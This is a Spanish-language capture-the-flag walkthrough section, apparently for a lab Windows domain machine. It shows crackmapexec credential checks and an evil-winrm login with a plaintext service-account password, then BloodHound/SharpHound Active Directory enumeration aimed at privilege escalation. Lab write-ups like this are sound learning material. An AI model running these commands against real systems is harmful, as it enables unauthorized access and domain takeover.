## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.


### Enumeracion del systema para preparar la escalada de privilegios {-}

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database
1. Collectamos la data con SharpHound.ps1

    - descargamos en sharphound
    
        ```bash
        wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
        ```

    - lo uploadeamos desde el evil-winrm

        ```bash
        upload SharpHound.ps1
        ```

    - lo lanzamos desde el evil-winrm

        ```bash
        Import-Module .\SharpHound.ps1
        Invoke-BloodHound -CollectionMethod All
        dir
        ```

    - ahora que tenemos el zip nos lo descargamos

        ```bash
        download 20210812133453_BloodHound.zip
        ```

1. Drag & Drop del fichero **.zip** hacia la ventana del bloodhound y en el Analysis tab

    - Find all Domains Admins -> Show Administrator of the domain
    

Aqui hay una via potencial (un camino) que nos permitte convertir en usuario administrador

```{r, echo = FALSE, fig.cap="Bloodhound privesc", out.width="90%"}
    knitr::include_graphics("images/Forest-bloodhound.png")
```
